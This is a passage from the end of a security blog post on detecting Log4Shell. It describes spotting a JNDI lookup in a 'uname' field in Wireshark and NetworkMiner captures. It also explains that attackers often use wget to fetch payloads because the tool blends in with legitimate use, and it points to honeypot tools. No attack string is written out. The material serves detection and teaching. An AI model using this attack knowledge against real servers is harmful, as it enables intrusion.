class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>In the same vein, when we take a look at the raw PCAP data in our Wireshark session we can follow the TCP stream and see the malicious Log4Shell attempt in the <code class="language-plaintext highlighter-rouge">uname</code> field highlighted below:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/blog/log4shell_what_is_it_images//16-image_log4shell.png" alt="" width="700" height="400" class="shadow" data-proofer-ignore> <em>Figure 16: Showing PCAP in Wireshark</em></p><h3 id="networkminer"><span class="mr-2">NetworkMiner:</span><a href="#networkminer" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Lastly, another great tool that you can leverage to examine potential attacking/malicious PCAP traffic is NetworkMiner.  NetworkMiner is great at parsing out data of interest in a PCAP capture that you can quickly identify.  In the screenshots below, I have the attack data of interest highlighted.  We can see the JNDI query in the <code class="language-plaintext highlighter-rouge">uname</code> field again, just like in Wireshark. In addition to that, we can also see the subsequent <code class="language-plaintext highlighter-rouge">wget</code> command I used in the video to pull the index.html file of Google main page. In an actual successful attack, you would likely see some kind of attempt to download an additional payload to the server.  <code class="language-plaintext highlighter-rouge">Wget</code> is probably the most common way to do so and is also pre-installed on most Linux distros.  Because of this an attacker can be “living off the land” when performing the initial compromise of a device.  This is because you might see legit usage of <code class="language-plaintext highlighter-rouge">wget</code> to install/update legitimate packages.</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/blog/log4shell_what_is_it_images//17-image_log4shell.png" alt="" width="700" height="400" class="shadow" data-proofer-ignore> <em>Figure 17: Showing NetworkMiner Capture</em></p><h2 id="final-thoughts"><span class="mr-2">Final Thoughts:</span><a href="#final-thoughts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Hopefully you found this walkthrough useful. There are various other things that you can do with Log4Shell as well. There is a POC from CyberReason that using the same vulnerability to “vaccinate” a server from the same attack. I’ll probably create a short walkthrough highlighting that as well in a later post. But if you are interested, definitely check it out: <a href="https://github.com/Cybereason/Logout4Shell">Logout4Shell</a>.</p><p>You might also way to see what attacks are happening in the wild. A great way to do that is using a HoneyPot. Thomas Spatzke’s <a href="https://github.com/thomaspatzke/Log4Pot">Log4Pot</a> is awesome for this. You could also install <a href="https://github.com/telekom-security/tpotce">T-Pot</a> which also has Log4Pot included in one of the deployments.</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/blog/log4shell_what_is_it_images//18-Log4Pot-Dashboard.png" alt="" width="700" height="400" class="shadow" data-proofer-ignore> <em>Figure 18: Log4Pot Dashboard</em></p><p>You can follow me on <a href="https://twitter.com/jt_dunnski">Twitter</a> where I’ll be sharing when I upload new posts.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/exploit-research/'>Exploit Research</a>, <a href='/categories/vulnerabilities/'>Vulnerabilities</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/log4shell/" class="post-tag no-text-decoration" >log4shell</a> <a href="/tags/malware/" class="post-tag no-text-decoration" >malware</a> <a href="/tags/exploit/" class="post-tag no-text-decoration" >exploit</a> <a href="/tags/vulnerabilities/" class="post-tag no-text-decoration" >vulnerabilities</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Log4Shell - What is it, How does it Work &amp; How to Detect it - JT_Dunnski&amp;url=https://dunnski.github.io/posts/log4shell_what_is_it_how_does_it_work_how_to_detect_it-copy/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Log4Shell - What is it, How does it Work &amp; How to Detect it - JT_Dunnski&amp;u=https://dunnski.github.io/posts/log4shell_what_is_it_how_does_it_work_how_to_detect_it-copy/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://dunnski.github.io/posts/log4shell_what_is_it_how_does_it_work_how_to_detect_it-copy/&amp;text=Log4Shell - What is it, How does it Work &amp; How to Detect it - JT_Dunnski" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://dunnski.github.io/posts/log4shell_what_is_it_how_does_it_work_how_to_detect_it-copy/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/how_to_set_up_homelab_blog/">Malware Analysis Series - Part 1, Setting Up a Basic Malware Analysis Virtual Lab</a><li><a href="/posts/how_to_isolate_homelab/">Malware Analysis Series - Part 2, How to Isolate our Homelab with Network Segmentation</a><li><a href="/posts/adding_scyllahide_plugin_to_x32_x64dbg/">Adding ScyllaHide Plugin to x32/64DBG</a><li><a href="/posts/disabling_windows_defender_for_malware_analysis_lab/">Disabling Windows Defender for Your Malware Analysis Lab</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/malware-analysis/">malware_analysis</a> <a class="post-tag" href="/tags/exploit/">exploit</a> <a class="post-tag" href="/tags/firewalla-gold/">firewalla_gold</a> <a class="post-tag" href="/tags/flare/">flare</a> <a class="post-tag" href="/tags/log4shell/">log4shell</a> <a class="post-tag" href="/tags/remnux/">remnux</a> <a class="post-tag" href="/tags/scyllahide/">scyllahide</a> <a class="post-tag" href="/tags/unifi/">unifi</a> <a class="post-tag" href="/tags/vmware/">vmware</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/how_to_set_up_homelab_blog/"><div class="card-body"> <em class="timeago small" data-ts="1627819200" > 2021-08-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Malware Analysis Series - Part 1, Setting Up a Basic Malware Analysis Virtual Lab</h3><div class="text-muted small"><p> Introduction: Since joining the Cyber Security and Intelligence community in 2016, I’ve always had a strong interest in malware analysis. The process of breaking something down, looking at its ind...</p></div></div></a></div><div class="card"> <a href="/posts/how_to_isolate_homelab/"><div class="card-body"> <em class="timeago small" data-ts="1633867200" > 2021-10-10 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Malware Analysis Series - Part 2, How to Isolate our Homelab with Network Segmentation</h3><div class="text-muted small"><p> Introduction: In part one of this series, we established a solid foundation to begin our malware analysis journey. We successfully stood up two VMs; a Windows(FLARE) machine and a Linux(REMnux) m...</p></div></div></a></div><div class="card"> <a href="/posts/adding_scyllahide_plugin_to_x32_x64dbg/"><div class="card-body"> <em class="timeago small" data-ts="1637409600" > 2021-11-20 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Adding ScyllaHide Plugin to x32/64DBG</h3><div class="text-muted small"><p> Introduction: Today I wanted to quickly detail how you can add the ScyllaHide plugin into your x32/64dbg tools. ScyllaHide is an open source plugin that can help to hide your debugger from common a...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/disabling_windows_defender_for_malware_analysis_lab/" class="btn btn-outline-primary" prompt="Older"><p>Disabling Windows Defender for Your Malware Analysis Lab</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://twitter.com/jt_dunnski">Joshua</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/malware-analysis/">malware_analysis</a> <a class="post-tag" href="/tags/exploit/">exploit</a> <a class="post-tag" href="/tags/firewalla-gold/">firewalla_gold</a> <a class="post-tag" href="/tags/flare/">flare</a> <a class="post-tag" href="/tags/log4shell/">log4shell</a> <a class="post-tag" href="/tags/remnux/">remnux</a> <a class="post-tag" href="/tags/scyllahide/">scyllahide</a> <a class="post-tag" href="/tags/unifi/">unifi</a> <a class="post-tag" href="/tags/vmware/">vmware</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en-us.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
